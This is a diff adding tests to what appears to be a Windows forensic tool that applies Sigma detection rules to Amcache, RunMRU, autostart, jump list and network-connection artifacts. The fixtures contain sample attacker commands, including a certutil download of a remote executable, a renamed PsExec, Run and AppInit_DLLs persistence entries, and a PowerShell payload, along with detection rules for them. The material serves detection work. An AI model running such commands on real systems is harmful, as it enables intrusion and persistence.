@@ -939,3 +939,89 @@ def test_a_bare_name_a_clean_system32_holds_resolves_without_the_file(tmp_path):
     assert W._resolved("\\RunDll32.exe", None, names) == "C:\\Windows\\System32\\RunDll32.exe"
     assert W._resolved("\\tool.exe", None, names) == "\\tool.exe"
     assert W._resolved("\\powershell.exe", None, names) == W._POWERSHELL
+
+
+# ------------------------------------------- v0.7.209: more of what the disk holds
+
+_RENAMED = (f"title: Renamed PsExec\nid: {_id('Renamed PsExec')}\nstatus: test\nlevel: high\n"
+            "logsource:\n    product: windows\n    category: process_creation\n"
+            "detection:\n    selection:\n        OriginalFileName: 'psexec.c'\n"
+            "    filter:\n        Image|endswith: '\\psexec.exe'\n"
+            "    condition: selection and not filter\n")
+
+
+def test_a_renamed_binary_is_known_by_the_original_name_amcache_keeps(tmp_path):
+    _write(_csvs(tmp_path) / "Execution" / "art_amcache_unassociated_files.csv",
+           ["Name", "FullPath", "SHA1", "FileKeyLastWriteTimestamp", "OriginalFileName",
+            "Description", "ProductName", "Publisher", "Version"],
+           [["svc.exe", r"C:\Users\jdoe\svc.exe", "", "2026-01-05 10:00:00", "psexec.c",
+             "Execute processes remotely", "Sysinternals PsExec", "Sysinternals",
+             "2.43"],
+            ["psexec.exe", r"C:\Tools\psexec.exe", "", "2026-01-05 10:00:00", "psexec.c",
+             "", "", "", ""]])
+    rows = _run(tmp_path, assets=_assets(tmp_path, {"process_creation": [_RENAMED]}))
+    (r,) = _by(rows, "Renamed PsExec")
+    assert r["source"] == "amcache" and r["count"] == "1"
+    assert r["match"] == "Image=C:\\Users\\jdoe\\svc.exe"
+
+
+def test_the_run_dialog_the_autostarts_and_the_jump_lists_run_as_processes(tmp_path):
+    _cmd_rules(tmp_path)
+    (tmp_path / "assets" / "sigma_custom" / "windows" / "process_creation" / "c4.yml"
+     ).write_text(_rule("From Explorer", "process_creation", {
+         "ParentImage|endswith": "\\explorer.exe", "Image|endswith": "\\certutil.exe"}),
+        encoding="utf-8")
+    (tmp_path / "assets" / "sigma_custom" / "windows" / "process_creation" / "c5.yml"
+     ).write_text(_rule("Rdp Out", "process_creation", {
+         "Image|endswith": "\\mstsc.exe", "CommandLine|contains": "/v:"}), encoding="utf-8")
+    reg = _csvs(tmp_path) / "Registry"
+    _write(reg / "art_reg_run_mru.csv", ["ValueName", "ValueData", "ValueData2", "ValueData3"], [
+        ["MRUList", "ba", "", ""],
+        ["a", "Executable: certutil -urlcache -f http://10.0.0.5/a a.exe",
+         "Opened On: 2026-01-09 10:00:00", "MRU: 0"],
+        ["b", "Executable: notepad", "Opened On: ", "MRU: 1"],
+        ["c", "Executable: services.msc", "Opened On: ", "MRU: 2"],
+        # places the Run dialog opens in Explorer, not programs
+        ["d", "Executable: \\\\10.0.0.5\\c$", "Opened On: ", "MRU: 3"],
+        ["e", "Executable: C:\\Users\\jdoe", "Opened On: ", "MRU: 4"],
+        ["f", "Executable: %temp%", "Opened On: ", "MRU: 5"],
+        ["g", "Executable: C:\\Program Files\\App v2.1\\data", "Opened On: ", "MRU: 6"]])
+    (tmp_path / "assets" / "sigma_custom" / "windows" / "process_creation" / "c6.yml"
+     ).write_text(_rule("Run Dialog", "process_creation", {
+         "ParentImage|endswith": "\\explorer.exe"}), encoding="utf-8")
+    (tmp_path / "assets" / "sigma_custom" / "windows" / "process_creation" / "c7.yml"
+     ).write_text(_rule("Snap-in", "process_creation", {
+         "Image|endswith": "\\mmc.exe", "CommandLine|endswith": ".msc"}), encoding="utf-8")
+    _write(_csvs(tmp_path) / "Persistence" / "art_reg_persistence.csv",
+           ["technique", "source", "detail", "suspicious"], [
+               ["run", r"HKU\jdoe\...\Run\Upd", r'"C:\Users\jdoe\evil.exe" -q', "yes"],
+               ["appinit_dlls", r"HKLM\...\AppInit_DLLs", r"C:\Users\jdoe\evil.exe", "yes"]])
+    jl = ["Path", "LocalPath", "Arguments", "LastModified"]
+    _write(_csvs(tmp_path) / "Execution" / "art_jumplist_automatic.csv", jl, [
+        [r"C:\Windows\System32\mstsc.exe", "", "/v:10.0.0.5", "2026-01-10 08:00:00"],
+        [r"C:\Users\jdoe\report.docx", "", "", "2026-01-10 08:00:00"]])
+    _write(_csvs(tmp_path) / "Execution" / "art_jumplist_custom.csv", jl, [
+        [r"C:\Users\jdoe\evil.exe", "", "--task", ""]])
+    rows = _run(tmp_path)
+    (c,) = _by(rows, "Certutil Download")
+    assert c["source"] == "run_mru" and c["first_seen"] == "2026-01-09 10:00:00"
+    assert _by(rows, "From Explorer")              # Win+R runs under Explorer
+    assert _by(rows, "Run Dialog")[0]["count"] == "3"     # the three commands, no place
+    assert _by(rows, "Snap-in")                   # an .msc runs in mmc.exe
+    # a Run value is a command; an AppInit DLL and a custom jump list task are not
+    assert [(r["source"], r["count"]) for r in _by(rows, "Evil Image")] == [("autostart", "1")]
+    (j,) = _by(rows, "Rdp Out")
+    assert j["source"] == "jumplist" and j["first_seen"] == "2026-01-10 08:00:00"
+
+
+def test_a_connection_carries_its_processs_command_line(tmp_path):
+    rule = _rule("Connecting Script", "network_connection",
+                 {"CommandLine|contains": "payload.ps1"})
+    hdr = ["pid", "path", "command_line", "user", "state", "proto", "local_ip", "local_port",
+           "remote_ip", "remote_port", "socket_created_utc", "start_utc"]
+    _write(_csvs(tmp_path) / "Network" / "art_process_network.csv", hdr, [
+        ["100", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
+         "powershell -f payload.ps1", "jdoe", "ESTABLISHED", "tcp", "10.0.0.9", "50000",
+         "10.0.0.5", "443", "2026-01-07 01:00:00", ""]])
+    rows = _run(tmp_path, assets=_assets(tmp_path, {"network_connection": [rule]}))
+    assert len(_by(rows, "Connecting Script")) == 1
